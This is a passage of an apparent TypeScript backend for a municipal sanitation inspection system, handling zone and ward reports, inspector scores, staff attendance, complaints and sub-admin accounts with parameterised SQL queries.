        time: new Date(r.submitted_at).toLocaleTimeString("en-IN", { timeZone: "Asia/Kolkata", hour: "2-digit", minute: "2-digit", hour12: true }),
        zone: r.zone_name,
        zoneId: r.zone_id,
        wardNo: r.ward_no,
        code: r.code,
        name: r.inspector_name,
        number: r.absent ? "A" : r.number,
        jhadu: r.jhadu,
        nali: r.nali,
        kooda: r.kooda,
        score: r.score,
        status: dto.status,
        leftMs: dto.leftMs,
      };
    }),
  };
}

export async function reportTable(bearer: string | undefined, input: ReportFilters) {
  const session = await requireOffice(bearer);
  if (!session) return deny();
  const sql = await db();
  const rows = (await loadEntries(input.from, input.to)).filter((r) => {
    if (!keepsZone(session, r.zone_id)) return false;
    if (input.zoneId && r.zone_id !== input.zoneId) return false;
    if (input.ward && r.ward_no !== input.ward) return false;
    return true;
  });
  const zones = await sql<{ id: number; name: string; inspectors: number }>`
    select z.id, z.name, (select count(*)::int from inspectors i where i.zone_id = z.id) as inspectors from zones z
  `;
  const zoneMap = new Map(zones.map((z) => [z.id, z]));
  const groups = new Map<string, EntryRow[]>();
  for (const row of rows) {
    const key = `${String(row.work_date).slice(0, 10)}|${row.zone_id}`;
    const list = groups.get(key) ?? [];
    list.push(row);
    groups.set(key, list);
  }
  const table = [...groups.entries()]
    .map(([key, list]) => {
      const [iso, zoneIdRaw] = key.split("|");
      const zone = zoneMap.get(Number(zoneIdRaw));
      const inspectors = zone?.inspectors ?? 0;
      const who = (flag: "jhadu" | "nali" | "kooda") => new Set(list.filter((r) => r[flag]).map((r) => r.inspector_id)).size;
      const numbers = list.map((r) => (r.absent ? "A" : String(r.number)));
      const wards = [...new Set(list.map((r) => r.ward_no).filter((w): w is number => w != null))].sort((a, b) => a - b);
      const avg = round2(list.reduce((s, r) => s + r.score, 0) / list.length);
      return {
        iso,
        date: dmy(iso),
        zoneId: Number(zoneIdRaw),
        zone: zone?.name ?? "",
        ward: wards.join(", ") || "—",
        inspectors,
        numbers: numbers.join(", "),
        jhadu: pct(who("jhadu"), inspectors, 0),
        nali: pct(who("nali"), inspectors, 0),
        kooda: pct(who("kooda"), inspectors, 0),
        score: avg,
      };
    })
    .sort((a, b) => (a.iso < b.iso ? 1 : a.iso > b.iso ? -1 : a.zoneId - b.zoneId));
  const scores = rows.map((r) => r.score);
  return {
    ok: true as const,
    total: rows.length,
    inspectors: new Set(rows.map((r) => r.inspector_id)).size,
    avg: scores.length ? round2(scores.reduce((a, b) => a + b, 0) / scores.length) : null,
    table,
  };
}

export async function inspectorWise(
  bearer: string | undefined,
  input: { from: string; to: string; zoneId: number | null; inspectorId: number | null },
) {
  const session = await requireOffice(bearer);
  if (!session) return deny();
  const sql = await db();
  const rows = (await loadEntries(input.from, input.to)).filter((r) => {
    if (!keepsZone(session, r.zone_id)) return false;
    if (input.zoneId && r.zone_id !== input.zoneId) return false;
    if (input.inspectorId && r.inspector_id !== input.inspectorId) return false;
    return true;
  });
  const people = await sql<{ id: number; code: string; name: string; zone_id: number | null }>`
    select id, code, name, zone_id from inspectors order by code
  `;
  const sorted = [...rows].sort((a, b) => {
    const da = String(a.work_date).slice(0, 10);
    const db = String(b.work_date).slice(0, 10);
    if (da !== db) return da < db ? 1 : -1;
    return compareCodes(a.code ?? "", b.code ?? "");
  });
  const scores = sorted.map((r) => r.score);
  return {
    ok: true as const,
    total: sorted.length,
    avg: scores.length ? round2(scores.reduce((a, b) => a + b, 0) / scores.length) : null,
    inspectors: people
      .filter((p) => keepsZone(session, p.zone_id) && (!input.zoneId || p.zone_id === input.zoneId))
      .sort((a, b) => compareCodes(a.code, b.code))
      .map((p) => ({ id: p.id, code: p.code, name: p.name, zoneId: p.zone_id })),
    rows: sorted.map((r) => ({
      date: dmy(String(r.work_date).slice(0, 10)),
      code: r.code ?? "",
      name: r.inspector_name ?? "",
      zone: r.zone_name ?? "",
      ward: r.ward_no ?? "—",
      number: r.number,
      absent: Boolean(r.absent),
      jhadu: r.jhadu,
      nali: r.nali,
      kooda: r.kooda,
      score: r.score,
    })),
  };
}

export async function markAbsent(
  bearer: string | undefined,
  input: { inspectorId: number; date: string; jhadu: boolean; nali: boolean; kooda: boolean; score: number },
) {
  const session = await requireOffice(bearer);
  if (!session || !(await ownsInspector(session, input.inspectorId))) return deny();
  if (!/^\d{4}-\d{2}-\d{2}$/.test(input.date)) return { ok: false as const, error: "date" as const };
  if (!input.jhadu && !input.nali && !input.kooda) return { ok: false as const, error: "work" as const };
  const score = Number(input.score);
  if (![1, 2, 3, 4, 5].includes(score)) return { ok: false as const, error: "score" as const };
  const sql = await db();
  const people = await sql<{ id: number; zone_id: number | null; ward_no: number | null }>`
    select id, zone_id, ward_no from inspectors where id = ${input.inspectorId}
  `;
  const person = people[0];
  if (!person?.zone_id) return { ok: false as const, error: "none" as const };
  const existing = await sql<{ id: number }>`
    select id from entries
    where inspector_id = ${person.id} and work_date = ${input.date}::date and absent = true
  `;
  if (existing[0]) {
    await sql`
      update entries
      set jhadu = ${input.jhadu}, nali = ${input.nali}, kooda = ${input.kooda}, score = ${score}, status = 'final', final_at = now()
      where id = ${existing[0].id}
    `;
    await closeMatchingComplaints(person.id, input);
    return { ok: true as const };
  }
  await sql`
    insert into entries (inspector_id, zone_id, ward_no, work_date, number, jhadu, nali, kooda, score, status, absent, final_at)
    values (${person.id}, ${person.zone_id}, ${person.ward_no}, ${input.date}::date, 0, ${input.jhadu}, ${input.nali}, ${input.kooda}, ${score}, 'final', true, now())
  `;
  await sql`
    insert into report_counters (zone_id, total_all_time)
    values (${person.zone_id}, 1)
    on conflict (zone_id) do update
    set total_all_time = report_counters.total_all_time + 1
  `;
  await closeMatchingComplaints(person.id, input);
  return { ok: true as const };
}

export async function staffDay(bearer: string | undefined, date: string) {
  const session = await requireOffice(bearer);
  if (!session) return deny();
  if (!/^\d{4}-\d{2}-\d{2}$/.test(date)) return { ok: false as const, error: "date" as const };
  const sql = await db();
  const people = await sql<{
    id: number;
    name: string;
    mobile: string;
    role: string;
    present: boolean | null;
    zone_id: number | null;
  }>`
    select s.id, s.name, s.mobile, s.role, a.present, a.zone_id
    from staff s
    left join staff_attendance a on a.staff_id = s.id and a.work_date = ${date}::date
    order by s.name
  `;
  const zones = await sql<{ id: number; name: string }>`select id, name from zones order by id`;
  const present = people.filter((p) => p.present === true).length;
  const absent = people.filter((p) => p.present === false).length;
  return {
    ok: true as const,
    date,
    dateLabel: dmy(date),
    total: people.length,
    present,
    absent,
    zones,
    staff: people.map((p) => ({
      id: p.id,
      name: p.name,
      mobile: p.mobile,
      role: p.role,
      zoneId: p.zone_id,
      present: p.present,
    })),
  };
}

export async function saveStaffDay(
  bearer: string | undefined,
  input: { date: string; rows: { id: number; present: boolean; zoneId: number | null }[] },
) {
  const session = await requireOffice(bearer);
  if (!session || level(session, "attendance") !== "edit") return deny();
  if (!/^\d{4}-\d{2}-\d{2}$/.test(input.date)) return { ok: false as const, error: "date" as const };
  const sql = await db();
  for (const row of input.rows) {
    const zoneId = row.zoneId == null ? null : Number(row.zoneId);
    await sql`
      insert into staff_attendance (staff_id, work_date, present, zone_id)
      values (${Number(row.id)}, ${input.date}::date, ${!!row.present}, ${zoneId})
      on conflict (staff_id, work_date) do update
      set present = excluded.present, zone_id = excluded.zone_id
    `;
  }
  return { ok: true as const };
}

export async function attendanceView(bearer?: string) {
  const session = await requireOffice(bearer);
  if (!session || level(session, "attendance") === "none") return deny();
  const sql = await db();
  const from = "2000-01-01";
  const staff = await sql<{ id: number; name: string }>`select id, name from staff order by name`;
  const marks = await sql<{
    work_date: string;
    staff_id: number;
    present: boolean;
    zone_id: number | null;
    zone_name: string | null;
  }>`
    select a.work_date, a.staff_id, a.present, a.zone_id, z.name as zone_name
    from staff_attendance a
    left join zones z on z.id = a.zone_id
    where a.work_date >= ${from}::date
  `;
  const scores = await sql<{ zone_id: number; work_date: string; avg: string | number | null }>`
    select zone_id, work_date, avg(score) as avg
    from entries
    where work_date >= ${from}::date
    group by zone_id, work_date
  `;
  const avgOf = new Map<string, number>();
  for (const row of scores) {
    if (row.avg == null) continue;
    avgOf.set(`${String(row.work_date).slice(0, 10)}|${row.zone_id}`, round2(Number(row.avg)));
  }
  const groups = new Map<string, { iso: string; cells: { staffId: number; present: boolean; zone: string; avg: number | null }[] }>();
  for (const mark of marks) {
    const iso = String(mark.work_date).slice(0, 10);
    const group = groups.get(iso) ?? { iso, cells: [] };
    const avg = mark.zone_id == null ? null : avgOf.get(`${iso}|${mark.zone_id}`) ?? null;
    group.cells.push({ staffId: mark.staff_id, present: mark.present, zone: mark.zone_name || "—", avg });
    groups.set(iso, group);
  }
  const rows = [...groups.values()]
    .map((group) => ({ ...group, date: dmy(group.iso) }))
    .sort((a, b) => (a.iso < b.iso ? 1 : -1));
  return { ok: true as const, staff, rows };
}

export async function staffBoard(bearer?: string) {
  const session = await requireOffice(bearer);
  if (!session) return deny();
  const sql = await db();
  const today = istNow().iso;
  const people = await sql<{
    id: number;
    name: string;
    mobile: string;
    role: string;
    zone_id: number | null;
    present: boolean | null;
  }>`
    select s.id, s.name, s.mobile, s.role, s.zone_id, a.present
    from staff s
    left join staff_attendance a on a.staff_id = s.id and a.work_date = ${today}::date
    order by s.id
  `;
  const zones = await sql<{ id: number; name: string }>`select id, name from zones order by id`;
  const present = people.filter((p) => p.present === true).length;
  const absent = people.filter((p) => p.present === false).length;
  return {
    ok: true as const,
    dateLabel: istNow().dmy,
    total: people.length,
    present,
    absent,
    unmarked: people.length - present - absent,
    zones,
    staff: people.map((p) => ({
      id: p.id,
      name: p.name,
      mobile: p.mobile,
      role: p.role,
      zoneId: p.zone_id,
      present: p.present,
    })),
  };
}

export async function addStaff(bearer: string | undefined, input: { name: string; mobile: string; role: string }) {
  const session = await requireOffice(bearer);
  if (!session || level(session, "staff") !== "edit") return deny();
  const name = input.name.trim();
  if (!name) return { ok: false as const, error: "name" as const };
  const sql = await db();
  await sql`insert into staff (name, mobile, role) values (${name}, ${input.mobile.trim()}, ${input.role.trim()})`;
  return { ok: true as const };
}

export async function patchStaff(
  bearer: string | undefined,
  input: { id: number; zoneId: number | null; present: boolean | null },
) {
  const session = await requireOffice(bearer);
  if (!session || level(session, "attendance") !== "edit") return deny();
  const sql = await db();
  await sql`update staff set zone_id = ${input.zoneId} where id = ${input.id}`;
  const today = istNow().iso;
  if (input.present === null) {
    await sql`delete from staff_attendance where staff_id = ${input.id} and work_date = ${today}::date`;
  } else {
    await sql`
      insert into staff_attendance (staff_id, work_date, present)
      values (${input.id}, ${today}::date, ${input.present})
      on conflict (staff_id, work_date) do update set present = excluded.present
    `;
  }
  return { ok: true as const };
}

export async function deleteStaff(bearer: string | undefined, id: number) {
  const session = await requireOffice(bearer);
  if (!session || level(session, "staff") !== "edit") return deny();
  const sql = await db();
  await sql`delete from staff where id = ${id}`;
  return { ok: true as const };
}

export async function metaLists(bearer?: string) {
  const session = await requireOffice(bearer);
  if (!session) return deny();
  const sql = await db();
  const zones = (await sql<{ id: number; name: string }>`select id, name from zones order by id`).filter((z) => keepsZone(session, z.id));
  const allWards = await sql<{ ward_no: number }>`select ward_no from wards order by ward_no`;
  let wardNos = allWards.map((w) => w.ward_no);
  if (session.role !== "admin") {
    const links = await sql<{ zone_id: number; ward_no: number }>`select zone_id, ward_no from zone_wards`;
    const ids = new Set(zones.map((z) => z.id));
    wardNos = [...new Set(links.filter((link) => ids.has(link.zone_id)).map((link) => link.ward_no))].sort((a, b) => a - b);
  }
  return { ok: true as const, zones, wards: wardNos };
}

function istStamp(value: unknown): { date: string; time: string } | null {
  if (!value) return null;
  const date = value instanceof Date ? value : new Date(String(value));
  if (Number.isNaN(date.getTime())) return null;
  const n = istNow(date);
  return { date: n.dmy, time: n.hm };
}

async function closeMatchingComplaints(
  inspectorId: number,
  flags: { jhadu: boolean; nali: boolean; kooda: boolean },
) {
  const sql = await db();
  await sql`
    update complaints
    set status = 'done', resolved_at = now()
    where inspector_id = ${inspectorId}
      and status = 'open'
      and (not jhadu or ${flags.jhadu})
      and (not nali or ${flags.nali})
      and (not kooda or ${flags.kooda})
  `;
}

export async function fileComplaint(
  bearer: string | undefined,
  input: { jhadu: boolean; nali: boolean; kooda: boolean },
) {
  const session = await resolveSession(bearer);
  if (!session || session.role !== "inspector") return deny();
  if (!input.jhadu && !input.nali && !input.kooda) return { ok: false as const, error: "work" as const };
  const profile = await inspectorProfile(session.inspectorId);
  const sql = await db();
  await sql`
    insert into complaints (inspector_id, zone_id, ward_no, jhadu, nali, kooda)
    values (${session.inspectorId}, ${profile?.zoneId ?? null}, ${profile?.wardNo ?? null}, ${input.jhadu}, ${input.nali}, ${input.kooda})
  `;
  return { ok: true as const };
}

export async function myComplaints(bearer?: string) {
  const session = await resolveSession(bearer);
  if (!session || session.role !== "inspector") return deny();
  const sql = await db();
  const rows = await sql<{
    id: number;
    jhadu: boolean;
    nali: boolean;
    kooda: boolean;
    status: string;
    created_at: string | Date;
    resolved_at: string | Date | null;
  }>`
    select id, jhadu, nali, kooda, status, created_at, resolved_at
    from complaints
    where inspector_id = ${session.inspectorId}
    order by created_at desc
  `;
  return {
    ok: true as const,
    rows: rows.map((row) => ({
      id: row.id,
      jhadu: row.jhadu,
      nali: row.nali,
      kooda: row.kooda,
      done: row.status === "done",
      date: istStamp(row.created_at)?.date ?? "—",
      solved: istStamp(row.resolved_at)?.date ?? "",
    })),
  };
}

export async function complaintCount(bearer?: string) {
  const session = await requireOffice(bearer);
  if (!session) return deny();
  const sql = await db();
  const rows = await sql<{ n: number; zone_id: number | null }>`select zone_id from complaints where seen_at is null`;
  const unseen = rows.filter((row) => keepsZone(session, row.zone_id)).length;
  return { ok: true as const, unseen };
}

export async function adminComplaints(bearer?: string) {
  const session = await requireOffice(bearer);
  if (!session) return deny();
  const sql = await db();
  const rows = await sql<{
    id: number;
    jhadu: boolean;
    nali: boolean;
    kooda: boolean;
    status: string;
    created_at: string | Date;
    resolved_at: string | Date | null;
    code: string;
    zone_id: number | null;
    zone_name: string | null;
  }>`
    select c.id, c.jhadu, c.nali, c.kooda, c.status, c.created_at, c.resolved_at, c.zone_id,
           i.code, z.name as zone_name
    from complaints c
    join inspectors i on i.id = c.inspector_id
    left join zones z on z.id = c.zone_id
    order by c.created_at desc
    limit 300
  `;
  return {
    ok: true as const,
    rows: rows.filter((row) => keepsZone(session, row.zone_id)).map((row) => {
      const opened = istStamp(row.created_at);
      const solved = istStamp(row.resolved_at);
      return {
        id: row.id,
        jhadu: row.jhadu,
        nali: row.nali,
        kooda: row.kooda,
        done: row.status === "done",
        doc: opened ? `${opened.date} ${opened.time}` : "—",
        dos: solved?.date ?? "—",
        zone: row.zone_name || "—",
        code: row.code,
      };
    }),
  };
}

export async function markComplaintsSeen(bearer?: string) {
  const session = await requireOffice(bearer);
  if (!session) return deny();
  const sql = await db();
  const allowed = zoneIdsOf(session);
  if (!allowed) {
    await sql`update complaints set seen_at = now() where seen_at is null`;
  } else if (allowed.length) {
    const open = await sql<{ id: number; zone_id: number | null }>`select id, zone_id from complaints where seen_at is null`;
    for (const row of open) {
      if (row.zone_id != null && allowed.includes(row.zone_id)) {
        await sql`update complaints set seen_at = now() where id = ${row.id}`;
      }
    }
  }
  return { ok: true as const };
}

type SubInput = {
  id?: number;
  name: string;
  username: string;
  password?: string;
  active?: boolean;
  attendance: Level;
  zone: Level;
  number: Level;
  staff: Level;
  councillor: Level;
  zones: { id: number; perm: Level }[];
};

export async function listSubAdmins(bearer?: string) {
  const session = await requireAdmin(bearer);
  if (!session) return deny();
  const sql = await db();
  const rows = await sql<{
    id: number;
    name: string;
    username: string;
    active: boolean;
    perm_attendance: string;
    perm_zone: string;
    perm_number: string;
    perm_staff: string;
    perm_councillor: string;
  }>`select id, name, username, active, perm_attendance, perm_zone, perm_number, perm_staff, perm_councillor from sub_admins order by id`;
  const perms = await sql<{ sub_admin_id: number; zone_id: number; perm: string }>`select sub_admin_id, zone_id, perm from sub_admin_zones`;
  return {
    ok: true as const,
    rows: rows.map((row) => ({
      id: row.id,
      name: row.name,
      username: row.username,
      active: row.active,
      attendance: asLevel(row.perm_attendance),
      zone: asLevel(row.perm_zone),
      number: asLevel(row.perm_number),
      staff: asLevel(row.perm_staff),
      councillor: asLevel(row.perm_councillor),
      zones: perms.filter((item) => item.sub_admin_id === row.id).map((item) => ({ id: item.zone_id, perm: asLevel(item.perm) })),
    })),
  };
}

export async function saveSubAdmin(bearer: string | undefined, input: SubInput) {
  const session = await requireAdmin(bearer);
  if (!session) return deny();
  const name = input.name.trim();
  const username = input.username.trim().toUpperCase();
  if (!name || username.length < 3) return { ok: false as const, error: "name" as const };
  if (username === "ADMIN" || username === "PASSWORD") return { ok: false as const, error: "name" as const };
  const password = (input.password || "").trim();
  if (!input.id && password.length < 6) return { ok: false as const, error: "password" as const };
  if (password && password.length < 6) return { ok: false as const, error: "password" as const };
  const sql = await db();
  const clash = await sql<{ id: number }>`select id from sub_admins where upper(username) = ${username} and id <> ${input.id ?? 0}`;
  if (clash.length) return { ok: false as const, error: "name" as const };
  const active = input.active !== false;
  let id = input.id ?? 0;
  if (id) {
    await sql`
      update sub_admins set name = ${name}, username = ${username}, active = ${active},
        perm_attendance = ${asLevel(input.attendance)}, perm_zone = ${asLevel(input.zone)},
        perm_number = ${asLevel(input.number)}, perm_staff = ${asLevel(input.staff)},
        perm_councillor = ${asLevel(input.councillor)}
      where id = ${id}
    `;
    if (password) {
      const password_hash = await hashPassword(password);
      await sql`update sub_admins set password_hash = ${password_hash} where id = ${id}`;
    }
    if (!active) await sql`delete from app_sessions where sub_admin_id = ${id}`;
  } else {
    const password_hash = await hashPassword(password);
    const created = await sql<{ id: number }>`
      insert into sub_admins (name, username, password_hash, active, perm_attendance, perm_zone, perm_number, perm_staff, perm_councillor)
      values (${name}, ${username}, ${password_hash}, ${active}, ${asLevel(input.attendance)}, ${asLevel(input.zone)}, ${asLevel(input.number)}, ${asLevel(input.staff)}, ${asLevel(input.councillor)})
      returning id
    `;
    id = created[0].id;
  }
  await sql`delete from sub_admin_zones where sub_admin_id = ${id}`;
  for (const zone of input.zones) {
    if (asLevel(zone.perm) === "none") continue;
    await sql`insert into sub_admin_zones (sub_admin_id, zone_id, perm) values (${id}, ${zone.id}, ${asLevel(zone.perm)})`;
  }
  return { ok: true as const, id };
}

export async function resetSubPassword(bearer: string | undefined, input: { id: number; password: string }) {
  const session = await requireAdmin(bearer);
  if (!session) return deny();
  const password = input.password.trim();
  if (password.length < 6) return { ok: false as const, error: "password" as const };
  const sql = await db();
  const password_hash = await hashPassword(password);
  await sql`update sub_admins set password_hash = ${password_hash} where id = ${input.id}`;
  await sql`delete from app_sessions where sub_admin_id = ${input.id}`;
  return { ok: true as const };
}

export async function removeSubAdmin(bearer: string | undefined, id: number) {
  const session = await requireAdmin(bearer);
  if (!session) return deny();
  const sql = await db();
  await sql`delete from sub_admins where id = ${id}`;
  return { ok: true as const };
}

export async function changeOwnPassword(bearer: string | undefined, input: { current: string; next: string }) {
  const session = await resolveSession(bearer);
  if (!session || session.role !== "subadmin") return deny();
  const next = input.next.trim();
  if (next.length < 6) return { ok: false as const, error: "password" as const };
  const sql = await db();
  const rows = await sql<{ password_hash: string }>`select password_hash from sub_admins where id = ${session.subAdminId} and active = true`;
  if (!rows[0] || !(await verifyPassword(input.current, rows[0].password_hash))) return { ok: false as const, error: "current" as const };
  const password_hash = await hashPassword(next);
  await sql`update sub_admins set password_hash = ${password_hash} where id = ${session.subAdminId}`;
  return { ok: true as const };
}
